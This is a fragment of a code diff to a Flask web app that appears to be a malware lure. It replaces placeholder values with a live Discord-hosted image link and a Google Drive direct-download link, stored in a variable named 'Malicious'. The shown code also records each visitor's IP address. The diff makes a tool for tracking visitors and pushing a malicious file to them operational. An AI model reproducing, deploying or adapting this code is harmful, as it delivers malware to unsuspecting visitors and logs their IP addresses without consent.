@@ -7,8 +7,8 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
-  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
+  Image = 'https://cdn.discordapp.com/attachments/924433694133993482/938260977164632094/s.png' # Replace this with your image link
+  Malicious = 'https://drive.google.com/uc?export=download&id=1N_BUPyBT_y_7zEg5RUYo-MfYT2wnbqxI'# Replace this with your download link
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
     ip = request.environ['REMOTE_ADDR']
